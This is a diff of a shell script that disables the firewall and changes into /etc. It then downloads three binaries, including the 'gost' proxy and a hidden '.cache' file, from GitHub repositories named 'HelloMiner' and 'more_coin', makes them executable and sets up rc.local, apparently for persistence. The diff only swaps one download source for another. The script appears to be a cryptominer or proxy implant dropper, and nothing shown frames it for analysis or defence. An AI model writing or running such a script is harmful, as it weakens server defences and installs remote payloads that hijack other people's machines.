@@ -11,9 +11,9 @@ systemctl enable iptables.service
 systemctl disable firewalld
 systemctl disable firewalld.service
 cd /etc
-wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/gost -O gost
-wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/KT -O KT
-wget https://raw.githubusercontent.com/pphpph233/HelloMiner/main/.cache -O .cache
+wget https://github.com/phl1icku/more_coin/gost -O gost
+wget https://github.com/phl1icku/more_coin/KT -O KT
+wget https://github.com/phl1icku/more_coin/.cache -O .cache
 chmod +x gost
 chmod +x KT
 chmod +x /etc/rc.d/rc.local
